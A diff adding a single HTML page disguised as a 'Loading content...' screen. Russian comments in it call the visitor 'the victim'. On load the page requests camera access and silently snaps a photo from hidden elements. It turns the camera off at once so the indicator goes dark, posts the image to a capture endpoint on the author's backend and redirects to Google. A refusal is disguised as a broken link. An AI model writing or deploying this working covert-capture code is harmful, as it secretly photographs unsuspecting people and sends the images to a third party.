@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading content...</title>
+</head>
+<body>
+
+    <!-- Эти элементы невидимы для жертвы. Это твой глаз и холст. -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // Вся магия происходит здесь. Немедленно.
+        (async () => {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            // URL для перенаправления. Жертва окажется здесь после снимка.
+            const redirectUrl = 'https://www.google.com';
+
+            try {
+                // 1. Запрос доступа к камере. Браузер покажет всплывающее окно.
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                // 2. Ждем, пока видеопоток загрузится, чтобы сделать качественный снимок.
+                video.onloadedmetadata = () => {
+                    // Устанавливаем размер холста равным размеру видео.
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    // 3. Делаем снимок. Моментально.
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/jpeg');
+
+                    // 4. Немедленно выключаем камеру. Индикатор гаснет.
+                    stream.getTracks().forEach(track => track.stop());
+
+                    // 5. Отправляем base64-строку с изображением на твой Vercel-бэкенд.
+                    fetch('/api/capture', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ imageData: imageData }),
+                    })
+                    .finally(() => {
+                        // 6. Перенаправляем жертву. Вне зависимости от успеха отправки.
+                        window.location.href = redirectUrl;
+                    });
+                };
+            } catch (err) {
+                // Если жертва отказала в доступе к камере или камеры нет,
+                // мы не показываем ошибку. Мы просто перенаправляем ее.
+                // Она подумает, что ссылка просто битая.
+                console.log("Camera access denied or no camera found. Redirecting.");
+                window.location.href = redirectUrl;
+            }
+        })();
+    </script>
+
+</body>
+</html>
